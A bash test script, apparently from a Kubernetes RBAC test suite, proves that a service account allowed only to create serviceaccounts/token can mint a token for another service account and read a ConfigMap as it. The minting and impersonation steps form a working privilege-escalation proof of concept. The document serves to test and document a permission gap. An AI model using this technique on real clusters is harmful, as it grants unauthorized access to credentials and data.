#!/usr/bin/env bash
# Identity assumption: create ServiceAccount/token -> act as the SA  (token-request-assumes-sa)
#
# Proof: an identity granted ONLY `create serviceaccounts/token` (not `get
# configmaps`) mints a bearer token for victim-sa via the TokenRequest
# subresource, then presents it to `get configmaps` as that SA -- gaining the
# SA's permission.
# Mechanism: ../transitions/token-request-assumes-sa.md
source "$(dirname "$0")/../lib.sh"
test_start "token-request-assumes-sa"

ns="$(new_ns tokreq-sa)"
cm_val="cfg-${RUN_ID}"

# Victim SA that CAN get configmaps, and a target ConfigMap.
step "admin creates victim-sa (may get configmaps) and ConfigMap 'target'"
mk_sa "$ns" victim-sa
grant_ns "$ns" victim-sa "" "configmaps" "get,list"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null || fail "could not create configmap"

# Attacker SA: ONLY `create serviceaccounts/token`. NOT get configmaps.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "serviceaccounts/token" "create"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: holds p (create serviceaccounts/token) but not q (get configmaps).
assert_can    "$subj" create serviceaccounts/token "$ns"
assert_cannot "$subj" get    configmaps            "$ns"

# ACT (as attacker, authenticated by its own token only, exercising ONLY p):
# mint a token for victim-sa. `kubectl create token` POSTs serviceaccounts/token.
atok="$(K -n "$ns" create token attacker)"
step "attacker mints a token for victim-sa via the TokenRequest subresource"
minted="$(ktoken "$atok" -n "$ns" create token victim-sa 2>/dev/null)"
assert_nonempty "$minted" "attacker minted victim-sa's token with 'create serviceaccounts/token'"

# Sanity: the attacker's own token still cannot read the ConfigMap, so the read
# below succeeds only because of the minted identity.
if ktoken "$atok" -n "$ns" get configmap target >/dev/null 2>&1; then
  fail "attacker's own token can already read the ConfigMap -- gap is not real"
fi

# EFFECT: present the minted token to read the ConfigMap as victim-sa.
step "attacker presents victim-sa's minted token to get ConfigMap 'target'"
got="$(ktoken "$minted" -n "$ns" get configmap target -o jsonpath='{.data.key}' 2>/dev/null)"
assert_eq "$got" "$cm_val" "attacker read the ConfigMap as victim-sa using the minted token"

test_pass
